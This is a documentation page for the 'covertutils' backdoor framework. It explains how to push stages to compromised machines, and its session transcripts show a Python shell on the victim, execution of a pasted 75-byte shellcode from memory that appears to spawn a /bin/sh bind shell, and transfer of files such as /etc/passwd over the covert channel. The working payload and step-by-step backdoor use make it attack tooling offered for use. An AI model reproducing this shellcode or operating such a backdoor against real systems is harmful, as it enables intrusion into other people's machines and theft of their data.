
.. _stages_page:

Beyond the OS Shell
===================

The ``covertutils`` package has an API for creating custom stages that can be dynamically loaded to compromised machines.
If a :class:`covertutils.handlers.stageable.StageableHandler` is running in a pwned machine stages can be pushed to it.

The API is fully documented in the :ref:`stage_api_page` page.



.. _pythonapi-stage:

The `Python` Stage
------------------

A Python shell with access to all internals is available.

The sent code runs directly in the `covertutils stage API`,
so it is able to access the ``storage`` and ``storage['COMMON']`` dictionaries and change internals objects at runtime.

.. code:: bash

	(127.0.0.1:49550)>
	(127.0.0.1:49550)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[99] - EXIT
	Select stream: 1
	[python] >>>
	[python] >>> print "Python module with access to the Stager API"
	[python] >>> Python module with access to the Stager API


	[python] >>> @
	No special command specified!
	Available special commands:
		@clear
		@show
		@storage
		@send
		@pyload
	[python] >>> @storage

	[python] >>> {'COMMON': {'handler': <covertutils.handlers.impl.standardshell.StandardShellHandler object at 0x7f6d472c9490>},
	 'on': True,
	 'queue': <Queue.Queue instance at 0x7f6d47066b90>}

	[python] >>> if "indentation is found" :
	[python] ...     print "The whole code block gets transmitted!"
	[python] ...
	[python] >>> The whole code block gets transmitted!

	[python] >>>
	[python] >>> print "@pyload command loads python files"
	[python] >>> @pyload command loads python files

	[python] >>> @pyload /tmp/pycode.py
	Buffer cleared!
	File '/tmp/pycode.py' loaded!
	[python] >>> @show
	====================
	print "This code exists in a file"

	====================
	[python] >>>
	[python] >>> This code exists in a file

	[python] >>>
	(127.0.0.1:49550)>






The `Shellcode` Stages
----------------------

When one can directly run stuff in a process, why not run some `shellcode` too?

And do it **directly from memory** please!

Runnning `shellcode` requires the following things:

 - Acquiring the shellcode!
 - Copying it to memory, to a known memory location
 - Making that location executable at runtime
 - ``jmp`` ing to that location

So ``covertutils`` has 2 `stages` that utilize ``ctypes`` built-in package to do the right things and finally run `shellcode`!
They are located under :mod:`covertutils.payloads.linux.shellcode` and :mod:`covertutils.payloads.windows.shellcode`.

A `SubShell` is also available that translates copy-pasted `shellcodes` from various sources to raw data, before sending them over to a poor `Agent`.


.. code:: bash

	(127.0.0.1:51038)> !stage mload covertutils.payloads.linux.shellcode
	 shellcode

	(127.0.0.1:51038)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - shellcode
		[ 4] - stage
		[99] - EXIT
	Select stream: 3
	This shell will properly format shellcode
		pasted from sources like "exploit-db.com" and "msfvenom"
	[shellcode]>
	[shellcode]>
	[shellcode]> unsigned char code[]= \

	Type 'GO' when done pasting...
	[shellcode]> "\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"

	Type 'GO' when done pasting...
	[shellcode]> "\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"

	Type 'GO' when done pasting...
	[shellcode]> "\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"

	Type 'GO' when done pasting...
	[shellcode]> "\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"

	Type 'GO' when done pasting...
	[shellcode]> "\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";

	Type 'GO' when done pasting...
	[shellcode]>
	[shellcode]> GO

	Type 'GO' when done pasting...
	====================
	Pasted lines:
	unsigned char code[]= \
	"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"
	"\x66\x68\x11\x5c\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
	"\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"
	"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"
	"\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";


	Length of 75 bytes

	Shellcode in HEX :
	6a6658995343536a0289e1cd805b5e526668115c526a026a10515089e1b066cd80894104b304b066cd8043b066cd809359b03fcd804979f9682f2f7368682f62696e89e35089e1b00bcd80

	Shellcode in BINARY :
	jfX�SCSj��̀[^Rfh\RjjQP���f̀�A��f̀C�f̀�Y�?̀Iy�h//shh/bin��P���

	====================
	Send the shellcode over? [y/N] y
	[shellcode]>

* The `shellcode` used in the demo is taken from https://www.exploit-db.com/exploits/42254/


Oh, and on more thing! `Shellcodes` do no need to be `Null Free` (of course!). The string termination is on Python, and they are transmitted **encrypted by design** anyway.



The `File` Stage
------------------

What good is a backdoor if you can't use it to **leak files**? Or even upload executables and that kind of stuff.

Actually, after the first smile when the pure `netcat reverse shell oneliner` returns, doing stuff with it becomes a pain really fast.
And the next step is trying to ``wget`` stuff with the non-tty shell, or copy-pasting `Base64 encoded` files from the screen.

Miserable things happen when there aren't specific commands for file upload/download to the compromised system. And out-of-band methods (`pastebin`, `wget`, etc) can easily be identified as abnormal...

The ``covertutils`` package has a `file` stage and subshell, to provide file transfers from the `Agent` to the `Handler` and vice-versa in an in-band manner (using the same `Communication Channel`).

.. code:: bash

	(127.0.0.1:56402)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - stage
		[99] - EXIT
	Select stream: 3
	=|file]> ~ help download
	download <remote-file> [<location>]

	=|file]> ~
	=|file]> ~ download /etc/passwd
	=|file]> ~ File downloaded!

	=|file]> ~ download /etc/passwd renamed.txt
	=|file]> ~ File downloaded!

	=|file]> ~ help upload
	upload  <local-file> [<remote-location>]

	=|file]> ~
	=|file]> ~ upload /etc/passwd myusers
	=|file]> ~ File uploaded succesfully!

	=|file]> ~
	=|file]> ~ upload /etc/passwd
	=|file]> ~ File uploaded succesfully!


.. warning:: Providing file transfer `in-band` is a double-edged knife.

	If the `Communication Channel` is a TCP connection then files will flow around nicely (taking also advantage of the embedded compression, see: :ref:`compressor_component` ).
	But if the `Communication Channel` is a `covert TCP backdoor` or such `super-low-bandwidth` channel, a 1MB file will `take forever to download`, taking over the whole channel. An out-of-band approach should be considered in this case.

.. warning:: Transfer of files can trigger the :class:`StreamIdentifier`'s `Birthday Problem` (TODO: document it) destroying 1 or more `streams` (the `control stream` should still work to ``!control reset`` the connection). For heavy use of file transferring, a bigger ``tag_length`` should be used on the :class:`Orchestrator` passed to the :class:`Handler` object.
